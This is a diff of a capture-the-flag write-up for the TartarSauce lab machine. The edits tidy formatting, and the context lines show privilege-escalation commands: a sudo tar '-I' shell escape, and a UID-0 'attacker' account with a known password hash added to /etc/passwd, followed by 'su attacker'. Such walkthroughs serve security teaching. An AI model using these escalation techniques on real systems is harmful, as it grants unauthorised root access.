@@ -326,7 +326,6 @@ User www-data may run the following commands on TartarSauce:
 www-data@TartarSauce:/usr/sbin$ /usr/bin/sudo -u onuma tar xf /dev/null -I '/bin/sh -c "sh <&2 1>&2"'
 <bin$ /usr/bin/sudo -u onuma tar xf /dev/null -I '/bin/sh -c "sh <&2 1>&2"'  
 $ whoami
-whoami
 onuma
 $
 ```
@@ -337,7 +336,6 @@ and capture the flag
 numa@TartarSauce:~$ pwd
 /home/onuma
 onuma@TartarSauce:~$ ls -al user.txt
-ls -al user.txt
 -r-------- 1 onuma onuma 33 Feb  9  2018 user.txt
 ```
 
@@ -448,7 +446,8 @@ var
         └── bash
 
 2 directories, 1 file
-                                                                                                                                                                   
+```
+
 Create a tar file of the directory tree
 
 ```
@@ -518,10 +517,9 @@ root:x:0:0:root:/root:/bin/bash
 daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
 bin:x:2:2:bin:/bin:/usr/sbin/nologin
 sys:x:3:3:sys:/dev:/usr/sbin/nologin
-...
+            ...
 attacker:$1$8z5VP0Cz$dl4f/98Ur.Dd/GegAjodl.:0:0:attacker:/root:/bin/bash
 bash-4.3# su attacker
-su attacker
 Password: 123456
 
 root@TartarSauce:/home/onuma# id
